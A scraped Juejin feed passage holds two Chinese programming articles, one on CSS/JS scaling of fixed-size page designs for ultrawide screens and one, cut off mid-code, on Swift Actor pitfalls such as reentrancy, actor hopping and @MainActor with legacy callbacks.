  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e7e7e7</span>;
}

<span class="hljs-selector-class">.box_1920</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-built_in">var</span>(--designW);
  <span class="hljs-attribute">height</span>: <span class="hljs-built_in">var</span>(--designH);
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>);
}
</code></pre>
<p>记得加上浏览器前缀：</p>
<pre><code class="hljs language-css" lang="css">-webkit-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>) <span class="hljs-built_in">scale</span>(<span class="hljs-built_in">var</span>(--s));
-ms-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>) <span class="hljs-built_in">scale</span>(<span class="hljs-built_in">var</span>(--s));
</code></pre>
<h3 data-id="heading-6">JS 部分</h3>
<p>用了 Swiper 做垂直轮播，配合导航栏联动。这块没什么特别的，常规操作：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> mySwiper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Swiper</span>(<span class="hljs-string">'.MySwiper'</span>, {
  <span class="hljs-attr">direction</span>: <span class="hljs-string">'vertical'</span>,
  <span class="hljs-attr">mousewheel</span>: { <span class="hljs-attr">forceToAxis</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-attr">keyboard</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-attr">on</span>: {
    <span class="hljs-attr">slideChange</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
      <span class="hljs-keyword">let</span> indexObj = { <span class="hljs-number">0</span>: <span class="hljs-string">'NAV1'</span>, <span class="hljs-number">1</span>: <span class="hljs-string">'NAV2'</span> }
      <span class="hljs-title function_">hederChangeNav</span>(indexObj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">activeIndex</span>]);
    },
  },
})

<span class="hljs-keyword">function</span> <span class="hljs-title function_">hederChangeNav</span> (val) {
  $(<span class="hljs-string">'.header .nav_item'</span>).<span class="hljs-title function_">removeClass</span>(<span class="hljs-string">'active'</span>);
  $(<span class="hljs-string">'.header .nav_item.'</span> + val).<span class="hljs-title function_">addClass</span>(<span class="hljs-string">'active'</span>);
  mySwiper.<span class="hljs-title function_">slideTo</span>(val === <span class="hljs-string">'NAV1'</span> ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>);
}
</code></pre>
<h2 data-id="heading-7">不同屏幕啥效果</h2>
<p>实测了几种屏幕：</p>





















<table><thead><tr><th>屏幕类型</th><th>效果</th></tr></thead><tbody><tr><td>16:9 普通屏</td><td>显示 1920 核心区域，2500 两边被裁掉，正常使用</td></tr><tr><td>21:9 带鱼屏</td><td>2500 区域完整显示，两边的装饰元素都能看到</td></tr><tr><td>32:9 超宽屏</td><td>上下会有黑边，因为高度先达到缩放上限</td></tr></tbody></table>
<p>32:9 的黑边其实也能接受，毕竟那种屏幕本来就少。真要适配可以再套一层更宽的容器，但感觉没必要。</p>
<h2 data-id="heading-8">踩的坑</h2>
<h3 data-id="heading-9">1. fixed 定位不跟着缩放</h3>
<p>导航栏用的 fixed 定位，结果发现它不受父容器 scale 影响。</p>
<p>一开始想着把导航也放 scale 容器里，但那样滚动的时候导航会跟着动。最后还是单独处理了，导航栏宽度写死，位置用百分比适配。</p>
<h3 data-id="heading-10">2. CSS min() 兼容性</h3>
<p><code>min()</code> 函数不支持 IE，老版本 Safari 也有问题。</p>
<p>如果要兼容老浏览器，得用 JS 算缩放比例，监听 resize 事件动态设置。大概这样：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateScale</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> s = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-number">1920</span>,
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> / <span class="hljs-number">1080</span>
  );
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'container_2500'</span>).<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = 
    <span class="hljs-string">`translate(-50%, -50%) scale(<span class="hljs-subst">${s}</span>)`</span>;
}
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, updateScale);
<span class="hljs-title function_">updateScale</span>();
</code></pre>
<p>不过现在项目不用管 IE 了，直接 CSS 搞定。</p>
<h3 data-id="heading-11">3. 字体模糊</h3>
<p>scale 缩放可能导致字体模糊，特别是缩放比例不是整数的时候。</p>
<p>没找到完美方案，加了个 <code>transform-origin: center</code> 稍微好点。如果真的很在意，可能得用别的方案了。</p>
<h2 data-id="heading-12">文件怎么放</h2>
<p>实际项目里我是这么组织内容的：</p>
<ul>
<li>主要内容、交互元素 → 放 <code>.box_1920</code> 里，确保普通屏幕也能正常用</li>
<li>装饰性背景、扩展视觉元素 → 放 <code>#container_2500</code> 里，带鱼屏用户能看到更多</li>
</ul>
<p>比如首屏背景图可以用 2500 宽的，两边是延伸的装饰，中间 1920 是主体。普通屏用户看到的就是 1920 的部分，带鱼屏用户能看到完整的 2500。</p>
<h2 data-id="heading-13">这方案适合什么场景</h2>
<p>适合：</p>
<ul>
<li>官网、落地页这种展示型页面</li>
<li>设计稿是固定尺寸的</li>
<li>不需要考虑移动端（移动端另外写一套）</li>
<li>不用支持 IE</li>
</ul>
<p>不适合：</p>
<ul>
<li>内容型网站，比如博客、文档站</li>
<li>需要响应式布局的</li>
<li>对文字清晰度要求极高的</li>
</ul>
<hr/>
<p>这个方案说白了就是"设计稿多大就做多大，然后整体缩放"。优点是简单，设计稿是啥样，页面就是啥样，不用考虑响应式布局，不用算百分比，所有尺寸直接写 px。缺点也很明显，只适合展示型页面，内容型网站别用这个，文章页面缩来缩去体验很差。其实我一直觉得这方案有点"作弊"的感觉，不够优雅。但能用、好维护、上线快，有时候这就够了。毕竟代码是写给人看的，也是写给 deadline 看的。</p>
<p>代码我放在github了，<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxxhe1024%2Fultrawide-scale-fit" target="_blank" title="https://github.com/xxhe1024/ultrawide-scale-fit" ref="nofollow noopener noreferrer">github.com/xxhe1024/ul…</a></p>
<p>有更好的方案欢迎评论区交流。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入剖析 Swift Actors：六大陷阱与避坑指南]]></title>    <link>https://juejin.cn/post/7603010441149939753</link>    <guid>https://juejin.cn/post/7603010441149939753</guid>    <pubDate>2026-02-05T10:25:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603010441149939753" data-draft-id="7603219519666339859" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入剖析 Swift Actors：六大陷阱与避坑指南"/> <meta itemprop="keywords" content="Swift"/> <meta itemprop="datePublished" content="2026-02-05T10:25:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="unravel2025"/> <meta itemprop="url" content="https://juejin.cn/user/1116759541421880"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入剖析 Swift Actors：六大陷阱与避坑指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1116759541421880/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    unravel2025
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:25:15.000Z" title="Thu Feb 05 2026 10:25:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>原文学习自：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.fractal-dev.com%2Fblog%2Fswift-actors-pitfalls" target="_blank" title="https://www.fractal-dev.com/blog/swift-actors-pitfalls" ref="nofollow noopener noreferrer">www.fractal-dev.com/blog/swift-…</a></p>
</blockquote>
<p>Swift 5.5 引入 Actors 时，苹果承诺这将终结数据竞争问题。"只需把 class 换成 actor，问题就解决了"——但事实远比这复杂。</p>
<h2 data-id="heading-0">陷阱 1：Reentrancy（重入）——Actor 不是串行队列</h2>
<p>这是最被低估的陷阱。大多数开发者认为 Actor 就像内置了 <code>DispatchQueue(label: "serial")</code> 串行队列的类。实际上并不是，这是个致命误解。</p>
<p>Actor 只保证一点：同一时刻只执行一个代码片段。 但在 <code>await</code> 之间，它可能处理完全不同的调用。</p>
<p>原理分析</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">BankAccount</span> {
    <span class="hljs-keyword">var</span> balance: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">amount</span>: <span class="hljs-type">Int</span>) <span class="hljs-keyword">async</span> -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-comment">// 检查余额</span>
        <span class="hljs-keyword">guard</span> balance <span class="hljs-operator">&gt;=</span> amount <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> }

        <span class="hljs-comment">// ⚠️ 挂起点 - 在此处 Actor 可以处理其他调用</span>
        <span class="hljs-keyword">await</span> authorizeTransaction()

        <span class="hljs-comment">// 返回后余额可能已经改变！</span>
        balance <span class="hljs-operator">-=</span> amount  <span class="hljs-comment">// 可能变成负数！</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">authorizeTransaction</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(for: .milliseconds(<span class="hljs-number">100</span>))
    }
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword">actor</span> = <span class="hljs-title class_">BankAccount</span>()
<span class="hljs-title class_">Task</span>.<span class="hljs-title class_">detached</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">actor</span>.withdraw(<span class="hljs-number">800</span>)
}
<span class="hljs-type">Task</span>.detached {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">actor</span>.withdraw(<span class="hljs-number">800</span>)
}

<span class="hljs-type">Task</span>.detached {
    <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">200</span> <span class="hljs-operator">*</span> <span class="hljs-number">1000_000</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> <span class="hljs-keyword">actor</span>.balance)
}
</code></pre>
<p>执行时序问题：</p>
<p>如果两个任务几乎同时调用 <code>withdraw(800)</code>：</p>
<ol>
<li>任务 A：检查 <code>balance &gt;= 800</code> → true</li>
<li>任务 A：等待 <code>authorizeTransaction()</code></li>
<li>任务 B：进入 Actor，检查 <code>balance &gt;= 800</code> → true（仍然是1000！）</li>
<li>任务 B：等待 <code>authorizeTransaction()</code></li>
<li>任务 A：返回，扣款800 → balance = 200</li>
<li>任务 B：返回，扣款800 → balance = -600 💥</li>
</ol>
<p>为什么会这样设计？</p>
<p>Apple 故意选择重入设计来避免死锁。如果两个 Actor 互相等待对方——没有重入就是经典死锁。有了重入，你得到的是……微妙的状态 Bug。</p>
<p>解决方案：Task Cache 模式</p>
<p>核心思想：在第一个挂起点之前同步修改状态。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">BankAccount</span> {
    <span class="hljs-keyword">var</span> balance: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>
    <span class="hljs-comment">// 存储正在处理的交易任务</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> pendingWithdrawals: [<span class="hljs-type">UUID</span>: <span class="hljs-type">Task</span>&lt;<span class="hljs-type">Bool</span>, <span class="hljs-type">Never</span>&gt;] <span class="hljs-operator">=</span> [:]

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">amount</span>: <span class="hljs-type">Int</span>, <span class="hljs-params">id</span>: <span class="hljs-type">UUID</span> <span class="hljs-operator">=</span> <span class="hljs-type">UUID</span>()) <span class="hljs-keyword">async</span> -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-comment">// 如果已经在处理这笔交易，等待结果</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> existing <span class="hljs-operator">=</span> pendingWithdrawals[id] {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> existing.value
        }

        <span class="hljs-comment">// 在任何 await 之前同步检查余额</span>
        <span class="hljs-keyword">guard</span> balance <span class="hljs-operator">&gt;=</span> amount <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> }

        <span class="hljs-comment">// 同步预留资金</span>
        balance <span class="hljs-operator">-=</span> amount

        <span class="hljs-comment">// 创建授权任务</span>
        <span class="hljs-keyword">let</span> task <span class="hljs-operator">=</span> <span class="hljs-type">Task</span> {
            <span class="hljs-keyword">await</span> authorizeTransaction()
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
        }
        pendingWithdrawals[id] <span class="hljs-operator">=</span> task

        <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> task.value
        pendingWithdrawals[id] <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>

        <span class="hljs-comment">// 如果授权失败，回滚</span>
        <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>result {
            balance <span class="hljs-operator">+=</span> amount
        }
        <span class="hljs-keyword">return</span> result
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">authorizeTransaction</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(for: .milliseconds(<span class="hljs-number">100</span>))
    }
}
</code></pre>
<p>关键改变：状态变更发生在同步代码块中，在任何 <code>await</code> 之前。</p>
<blockquote>
<p>注意：这只是解决重入问题的模式之一，并非唯一或总是最佳方案。其他替代方案包括：Actor + 纯异步服务拆分、乐观锁（optimistic locking），或在特定情况下使用 <code>nonisolated</code> + 锁。选择取决于具体用例。</p>
</blockquote>
<h2 data-id="heading-1">陷阱 2：Actor Hopping——性能杀手</h2>
<p>每次跨越 Actor 边界都是一次潜在的上下文切换。在循环中这可能是灾难。</p>
<p>性能问题</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Database</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadUser</span>(<span class="hljs-params">id</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">User</span> {
        <span class="hljs-comment">// 耗时操作</span>
        <span class="hljs-type">User</span>(id: id)
    }
}

<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataModel</span> {
    <span class="hljs-keyword">let</span> database <span class="hljs-operator">=</span> <span class="hljs-type">Database</span>()
    <span class="hljs-keyword">var</span> users: [<span class="hljs-type">User</span>] <span class="hljs-operator">=</span> []

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadUsers</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">100</span> {
            <span class="hljs-comment">// ❌ 200 次上下文切换！</span>
            <span class="hljs-keyword">let</span> user <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> database.loadUser(id: i)
            users.append(user)
        }
    }
}
</code></pre>
<p>每次迭代：</p>
<ol>
<li>从 MainActor 跳转到 Database Actor</li>
<li>从 Database Actor 跳回 MainActor</li>
</ol>
<p>100 次迭代 = 200 次跳转。苹果在 WWDC 2021 "Swift Concurrency: Behind the Scenes" 中展示了这在 CPU 上的模式——像"锯齿"一样持续中断。</p>
<p>解决方案：批处理（Batching）</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Database</span> {
    <span class="hljs-comment">// 批量加载用户</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadUsers</span>(<span class="hljs-params">ids</span>: [<span class="hljs-type">Int</span>]) -&gt; [<span class="hljs-type">User</span>] {
        ids.map { <span class="hljs-type">User</span>(id: <span class="hljs-variable">$0</span>) }  <span class="hljs-comment">// 一次完成所有操作</span>
    }
}

<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataModel</span> {
    <span class="hljs-keyword">let</span> database <span class="hljs-operator">=</span> <span class="hljs-type">Database</span>()
    <span class="hljs-keyword">var</span> users: [<span class="hljs-type">User</span>] <span class="hljs-operator">=</span> []

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadUsers</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">let</span> ids <span class="hljs-operator">=</span> <span class="hljs-type">Array</span>(<span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">100</span>)
        <span class="hljs-comment">// ✅ 一次跳转去，一次跳转回</span>
        <span class="hljs-keyword">let</span> newUsers <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> database.loadUsers(ids: ids)
        users.append(contentsOf: newUsers)
    }
}
</code></pre>
<p>何时真正影响性能？</p>
<p>在协作线程池（cooperative pool）内跳转很便宜。问题出现在与 MainActor 的跳转，因为主线程不在协作池中，需要真正的上下文切换。</p>
<p>经验法则：如果一次操作中有超过 10 次跳转到 MainActor，很可能架构有问题。</p>
<h2 data-id="heading-2">陷阱 3：@MainActor——虚假的安全感</h2>
<p>这是 Swift 6 发布后捕获数百名开发者的陷阱。<code>@MainActor</code> 注解不总能保证在主线程执行。</p>
<p>问题根源</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewModel</span> {
    <span class="hljs-keyword">var</span> data: <span class="hljs-type">String</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateData</span>() {
        <span class="hljs-comment">// Swift 5 中：可能不在主线程！</span>
        data <span class="hljs-operator">=</span> <span class="hljs-string">"updated"</span>
    }
}

<span class="hljs-comment">// 在某个地方...</span>
<span class="hljs-type">DispatchQueue</span>.global().async {
    <span class="hljs-keyword">let</span> vm <span class="hljs-operator">=</span> <span class="hljs-type">ViewModel</span>()
    vm.updateData()  <span class="hljs-comment">// ⚠️ 在后台线程执行！</span>
}
</code></pre>
<p>关键区别：</p>
<ol>
<li>@MainActor 隔离性：保证状态访问被隔离到 MainActor（MainActor 与主线程绑定）</li>
<li>异步边界强制执行：但此保证只在调用跨越隔离边界（async boundary）时生效</li>
</ol>
<p>当代码绕过这个边界——特别是与 Objective-C 遗留 API 交互时，问题就出现了。苹果框架的回调"不知道" Swift Concurrency，会直接调用你的方法，不经过异步边界。</p>
<p>换句话说：<code>@MainActor</code> 是编译时契约，只在编译器"看到"完整调用路径的地方强制执行。遗留 API 对它来说是个黑箱。</p>
<p>与遗留 API 交互的失败案例</p>
<p>案例 1：系统框架回调</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> LocalAuthentication

<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BiometricManager</span> {
    <span class="hljs-keyword">var</span> isAuthenticated <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">authenticate</span>() {
        <span class="hljs-keyword">let</span> context <span class="hljs-operator">=</span> <span class="hljs-type">LAContext</span>()
        context.evaluatePolicy(
            .deviceOwnerAuthentication,
            localizedReason: <span class="hljs-string">"请登录"</span>
        ) { success, <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span>
            <span class="hljs-comment">// ❌ 这个回调总是在后台线程！</span>
            <span class="hljs-keyword">self</span>.isAuthenticated <span class="hljs-operator">=</span> success  <span class="hljs-comment">// 数据竞争！</span>
        }
    }
}
</code></pre>
<p>案例 2：Objective-C 代理模式</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> CoreLocation

<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LocationHandler</span>: <span class="hljs-title class_">NSObject</span>, <span class="hljs-title class_">CLLocationManagerDelegate</span> {
    <span class="hljs-keyword">var</span> lastLocation: <span class="hljs-type">CLLocation</span>?

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">locationManager</span>(
        <span class="hljs-keyword">_</span> <span class="hljs-params">manager</span>: <span class="hljs-type">CLLocationManager</span>,
        <span class="hljs-params">didUpdateLocations</span> <span class="hljs-params">locations</span>: [<span class="hljs-type">CLLocation</span>]
    ) {
        <span class="hljs-comment">// ❌ 可能从任意线程调用！</span>
        lastLocation <span class="hljs-operator">=</span> locations.last
    }
}
</code></pre>
<p>解决方案：显式调度</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 方案 1：使用 async/await API</span>
<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BiometricManager</span> {
    <span class="hljs-keyword">var</span> isAuthenticated <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">authenticate</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">let</span> context <span class="hljs-operator">=</span> <span class="hljs-type">LAContext</span>()

        <span class="hljs-keyword">do</span> {
            <span class="hljs-keyword">let</span> success <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> context.evaluatePolicy(
                .deviceOwnerAuthentication,
                localizedReason: <span class="hljs-string">"请登录"</span>
            )
            isAuthenticated <span class="hljs-operator">=</span> success  <span class="hljs-comment">// ✅ 现在在 MainActor 上</span>
        } <span class="hljs-keyword">catch</span> {
            isAuthenticated <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
        }
    }
}

<span class="hljs-comment">// 方案 2：使用 Task 显式跳转</span>
<span class="hljs-keyword">extension</span> <span class="hljs-title class_">LocationHandler</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">locationManager</span>(
        <span class="hljs-keyword">_</span> <span class="hljs-params">manager</span>: <span class="hljs-type">CLLocationManager</span>,
        <span class="hljs-params">didUpdateLocations</span> <span class="hljs-params">locations</span>: [<span class="hljs-type">CLLocation</span>]
    ) {
        <span class="hljs-comment">// 显式跳转到 MainActor</span>
        <span class="hljs-type">Task</span> { <span class="hljs-meta">@MainActor</span> <span class="hljs-keyword">in</span>
            lastLocation <span class="hljs-operator">=</span> locations.last  <span class="hljs-comment">// ✅ 安全</span>
        }
    }
}

<span class="hljs-comment">// 方案 3：使用 @MainActor 闭包</span>
